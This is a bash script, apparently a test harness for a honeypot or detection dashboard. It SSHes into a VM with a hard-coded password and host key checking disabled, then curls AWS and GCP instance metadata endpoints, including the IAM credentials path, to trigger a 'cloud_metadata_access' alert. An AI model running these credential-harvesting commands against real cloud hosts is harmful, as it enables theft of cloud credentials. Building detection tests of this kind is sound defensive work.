#!/usr/bin/env bash
# Cloud Metadata Access Attack
# Querying AWS/GCP/Azure instance metadata endpoints to steal credentials and tokens.
#
# Usage:  scripts/attack-cloud-metadata.sh [VM-IP]
# Default VM IP: 192.168.1.79
#
# Dashboard: http://<VM-IP>:5173
# What to look for: cloud_metadata_access category, 169.254.169.254 in indicators

set -euo pipefail
IP="${1:-192.168.1.79}"
echo ""
echo "==================================================================="
echo "  Cloud Metadata Access Attack"
echo "==================================================================="
echo "  Target:    $IP:2222"
echo "  Category:  cloud_metadata_access"
echo "==================================================================="
echo ""

sshpass -p "password" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o ConnectTimeout=10 \
  -p 2222 \
  ubuntu@$IP \
  "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ ; curl -s http://metadata.google.internal/computeMetadata/v1/instance/ ; curl -s http://169.254.169.254/latest/meta-data/" 2>&1 || true

echo ""
echo "  ✓ Attack complete"
echo "  → Dashboard:  http://$IP:5173"
echo "  → API check:  curl -s http://$IP:5000/api/events?attack_category=cloud_metadata_access&limit=3 | python3 -m json.tool"
echo ""
